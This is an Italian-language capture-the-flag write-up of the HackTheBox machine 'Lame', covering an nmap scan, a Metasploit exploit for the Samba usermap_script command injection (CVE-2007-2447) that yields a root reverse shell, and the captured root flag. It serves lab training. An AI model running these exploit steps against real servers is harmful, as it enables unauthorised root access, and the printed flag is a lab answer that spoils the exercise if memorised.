---
title: "HackTheBox — Machine Lame"
date: "2026-09-15"
category: "HackTheBox"
platform: "HackTheBox"
difficulty: "Easy"
tags:
  - linux
  - samba
  - metasploit
  - CVE-2007-2447
---

## Enumerazione

Il primo passo è stato un classico `nmap` scan sulla macchina target:

```bash
nmap -sC -sV -oN lame.nmap 10.10.10.3
```

### Porte aperte

| Porta  | Servizio   | Versione                    |
|--------|------------|-----------------------------|
| 21     | FTP        | vsftpd 2.3.4               |
| 22     | SSH        | OpenSSH 4.7p1               |
| 139    | Samba      | Samba smbd 3.0.20-Debian    |
| 445    | Samba      | Samba smbd 3.0.20-Debian    |

## Foothold — Samba Exploit (CVE-2007-2447)

La versione di Samba è vulnerabile a **CVE-2007-2447** (username map script command injection).

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST tun0
exploit
```

Ottenuto immediatamente una shell come **root**:

```
whoami
# root
```

## Flag

```
cat /root/root.txt
# 92caac3be140ef409e45721348a4e9df
```

## Lezioni apprese

- Non sottovalutare i servizi legacy: Samba 3.0.20 ha una vulnerabilità critica nota da anni.
- L'enumerazione è tutto: un buon `nmap` scan rivela subito i vettori d'attacco.
- Le macchine "Easy" sono perfette per consolidare le basi della metodologia.
